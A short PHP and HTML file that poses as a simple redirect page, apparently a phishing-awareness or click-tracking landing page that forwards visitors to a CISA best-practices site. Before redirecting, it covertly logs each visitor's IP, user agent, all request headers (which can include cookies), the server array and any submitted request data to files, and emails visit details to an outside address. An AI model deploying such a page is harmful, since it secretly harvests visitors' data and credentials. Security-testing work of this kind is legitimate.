<?php
$today = date("F j, Y, g:i a");
$data = json_encode(array("headers" => getallheaders(), "server" => $_SERVER, "request" => $_REQUEST));
file_put_contents("summary.txt", $today . "\t" . $_SERVER['REMOTE_ADDR'] . "\t" . $_SERVER['HTTP_USER_AGENT'] . "\n", FILE_APPEND);
file_put_contents("full-data.txt", $data . "\n", FILE_APPEND);
$message = $today . " - " . $_SERVER['REMOTE_ADDR'];
mail('bojib80610@sfpixel.com', 'subject', $message);
?>
<html><head><meta charset="UTF-8" />
<meta http-equiv="refresh" content="1;url=https://www.cisa.gov/topics/cybersecurity-best-practices" />
<script type="text/javascript">window.location.href = "https://www.cisa.gov/topics/cybersecurity-best-practices"</script>
<title>Page Redirection</title></head>
<body>If you are not redirected automatically, follow the <a href="https://www.cisa.gov/topics/cybersecurity-best-practices">link</a>.</body></html>